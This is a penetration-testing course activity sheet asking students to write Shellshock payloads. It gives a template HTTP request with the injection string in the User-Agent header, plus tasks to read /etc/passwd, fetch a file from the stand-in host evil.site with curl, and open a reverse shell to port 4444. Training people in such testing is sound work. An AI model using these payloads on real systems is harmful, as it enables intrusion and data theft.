## Activity File: Shellshock Payloads

In this activity, you will play the role of a penetration tester evaluating a client's machine for the Shellshock vulnerability. 

- You are tasked with using a template script to create custom exploits for the Shellshock vulnerability.

- Please use the example site `http://evil.site/mal.php` for creating your templates. 

### Instructions

Use the following template example as a reference:

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; /bin/bash -c `command`
  Connection: keep-alive
  ```

- **Note:** The malicious command is preceded by `() { :;}; /bin/bash -c` in the `User-Agent` value. 

Open a text editor and write Shellshock payloads for the  tasks below. You may need to do additional research to complete the code injections. 

1. Read `/etc/passwd`.

2. Use `curl` to download a malicious file from `http://evil.site/mal.php`.

3. Open a netcat/ncat listener on your host's port `4444`.

4. Send a reverse shell to your port 4444 (in this example, use the IP address `192.168.0.8`). 


---
 
&copy; 2020 Trilogy Education Services, a 2U Inc Brand.  All Rights Reserved.
